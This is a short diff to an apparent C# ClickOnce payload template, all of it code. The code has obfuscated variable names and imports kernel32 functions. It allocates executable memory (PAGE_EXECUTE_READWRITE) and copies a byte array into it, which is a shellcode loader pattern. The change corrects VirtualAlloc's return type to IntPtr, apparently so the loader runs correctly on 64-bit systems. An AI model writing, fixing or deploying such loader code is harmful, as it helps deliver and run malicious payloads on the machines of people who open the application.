@@ -16,7 +16,7 @@ namespace ClickOnceTemplate
 		private static UInt32 VAR40 = 0x1000;
 		private static UInt32 VAR41 = 0x40;
 		[DllImport("kernel32")]
-		private static extern UInt32 VirtualAlloc(UInt32 VAR21, UInt32 VAR12, UInt32 VAR16, UInt32 VAR8);
+		private static extern IntPtr VirtualAlloc(UInt32 VAR21, UInt32 VAR12, UInt32 VAR16, UInt32 VAR8);
 		[DllImport("kernel32")]
 		private static extern UInt32 WaitForSingleObject(IntPtr VAR4, UInt32 VAR17);
 		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
@@ -61,7 +61,7 @@ namespace ClickOnceTemplate
 				IntPtr VAR34 = GetProcAddress(VAR33, Encoding.ASCII.GetString(VAR103));
 				VAR32 VAR35 = (VAR32)Marshal.GetDelegateForFunctionPointer(VAR34, typeof(VAR32));
 
-				UInt32 VAR42 = VirtualAlloc(0, (UInt32)VAR11.Length, VAR40, VAR41);
+				IntPtr VAR42 = VirtualAlloc(0, (UInt32)VAR11.Length, VAR40, VAR41);
 				Marshal.Copy(VAR11, 0, (IntPtr)(VAR42), VAR11.Length);
 				IntPtr VAR43 = IntPtr.Zero;
 				IntPtr VAR44 = IntPtr.Zero;
